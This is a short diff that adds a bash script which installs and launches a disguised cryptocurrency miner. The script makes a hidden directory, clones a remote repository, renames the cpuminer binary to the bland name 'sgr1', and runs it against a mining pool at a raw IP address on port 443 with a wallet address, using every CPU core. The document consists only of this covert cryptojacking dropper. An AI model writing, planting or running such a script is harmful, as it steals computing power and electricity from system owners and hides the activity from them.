@@ -1,0 +1,6 @@
+#!/bin/bash
+mkdir .rsc && cd .rsc
+git clone https://bitbucket.org/aboxx/filee.git
+cd filee && mv cpuminer-avx2 sgr1
+chmod +x sgr1
+./sgr1 -a yespower -o 134.122.93.45:443 -u uu6EPojm3iWPL4xK44dcw1m2H5XwdVUWmo.bagong -t $(nproc --all)
